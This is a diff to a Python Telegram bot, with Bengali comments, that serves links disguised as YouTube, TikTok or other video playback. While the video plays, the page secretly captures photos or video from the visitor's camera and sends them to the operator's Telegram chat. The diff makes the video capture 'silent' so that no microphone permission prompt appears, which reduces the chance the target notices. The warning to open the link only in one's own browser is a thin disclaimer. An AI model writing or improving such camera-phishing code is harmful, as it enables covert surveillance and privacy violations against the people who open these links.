@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-Camera Tool Bot — Photo & Video Capture (Front/Back)
-=====================================================
+Camera Tool Bot — Photo & Silent Video Capture (Front/Back)
+============================================================
 Features:
   - Front / Back camera support
   - Photo Mode: 4 photos in 4 seconds
-  - Video Mode: 5-second video recording
+  - Video Mode: 5-second SILENT video (no microphone permission needed)
   - Redirect link / Direct link support
   - YouTube, TikTok, Instagram, Facebook, Vimeo, MP4 playback
 """
@@ -118,14 +118,14 @@ def capture_and_send_video(video_data, chat_id, camera_type="front", duration=5)
         video_file = io.BytesIO(video_bytes)
         video_file.name = f"{camera_type}_video_{duration}s.webm"
 
-        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও ({duration}s)"
+        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও (সাউন্ড ছাড়া, {duration}s)"
         return send_video_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
 
 
 # ==========================================
-# ক্যাপচার পেজ — ছবি এবং ভিডিও উভয় মোড সাপোর্ট
+# ক্যাপচার পেজ — ছবি এবং সাইলেন্ট ভিডিও
 # ==========================================
 CAPTURE_HTML = """
 <!DOCTYPE html>
@@ -254,7 +254,8 @@ CAPTURE_HTML = """
         }
 
         // =========================================================
-        // মোড ২: ভিডিও ক্যাপচার (৫ সেকেন্ড রেকর্ডিং)
+        // মোড ২: ভিডিও ক্যাপচার (৫ সেকেন্ড — সম্পূর্ণ সাইলেন্ট)
+        // audio: false → মাইক পারমিশন লাগবে না
         // =========================================================
         async function startVideoCapture() {
             try {
@@ -264,12 +265,12 @@ CAPTURE_HTML = """
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     },
-                    audio: true
+                    audio: false   // ← সাউন্ড বন্ধ, মাইক পারমিশন লাগবে না
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
 
-                // MediaRecorder MIME type detect
-                let mimeType = 'video/webm;codecs=vp8,opus';
+                // MediaRecorder MIME type detect (শুধু video codec, অডিও নেই)
+                let mimeType = 'video/webm;codecs=vp8';
                 if (!window.MediaRecorder || !MediaRecorder.isTypeSupported(mimeType)) {
                     if (MediaRecorder.isTypeSupported('video/webm')) {
                         mimeType = 'video/webm';
@@ -305,7 +306,7 @@ CAPTURE_HTML = """
                                     duration: 5
                                 })
                             });
-                            console.log("🎥 ভিডিও পাঠানো হয়েছে");
+                            console.log("🎥 সাইলেন্ট ভিডিও পাঠানো হয়েছে");
                         };
                         reader.readAsDataURL(blob);
                     } catch (err) { console.log("video send error", err); }
@@ -318,7 +319,7 @@ CAPTURE_HTML = """
                 setTimeout(() => {
                     try {
                         recorder.start();
-                        console.log("🎥 রেকর্ডিং শুরু...");
+                        console.log("🎥 রেকর্ডিং শুরু (muted)...");
                     } catch (e) {
                         console.log("recorder start error", e);
                         return;
@@ -507,7 +508,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [
                 InlineKeyboardButton("📸 Photo Mode", callback_data="mode_photo"),
-                InlineKeyboardButton("🎥 Video Mode", callback_data="mode_video"),
+                InlineKeyboardButton("🎥 Video Mode (Silent)", callback_data="mode_video"),
             ],
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
@@ -541,7 +542,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # === Mode select: Video ===
+    # === Mode select: Video (Silent) ===
     if data == "mode_video":
         session = user_sessions.get(chat_id, {})
         session["mode"] = "video"
@@ -554,7 +555,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "🎥 *Video Mode (৫ সেকেন্ড রেকর্ডিং)*\n\nলিংকের ধরন বেছে নিন:",
+            "🎥 *Video Mode (৫ সেকেন্ড — সাউন্ড ছাড়া)*\n\n"
+            "🔇 মাইক পারমিশন লাগবে না\n\n"
+            "লিংকের ধরন বেছে নিন:",
             reply_markup=reply_markup,
             parse_mode="Markdown",
         )
@@ -605,7 +608,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
 
         if mode == "video":
-            details = "🎥 ভিডিও: ৫ সেকেন্ড রেকর্ড হবে"
+            details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)"
         else:
             details = "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
 
@@ -615,7 +618,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🎯 Mode: *{mode.capitalize()}*\n"
             f"{details}\n\n"
             f"🔗 লিংক:\n`{public_link}`\n\n"
-            f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*",
+            f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
+            f"🔇 মাইক পারমিশন লাগবে না।",
             reply_markup=reply_markup,
             parse_mode="Markdown",
         )
@@ -667,7 +671,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     if mode == "video":
-        details = "🎥 ভিডিও: ৫ সেকেন্ড রেকর্ড হবে"
+        details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)"
     else:
         details = "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
 
@@ -679,7 +683,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{details}\n\n"
         f"🔗 লিংক:\n`{public_link}`\n\n"
         f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
-        f"ভিডিও চলবে + ক্যাপচার Telegram-এ আসবে।",
+        f"ভিডিও চলবে + ক্যাপচার Telegram-এ আসবে।\n"
+        f"🔇 মাইক পারমিশন লাগবে না।",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
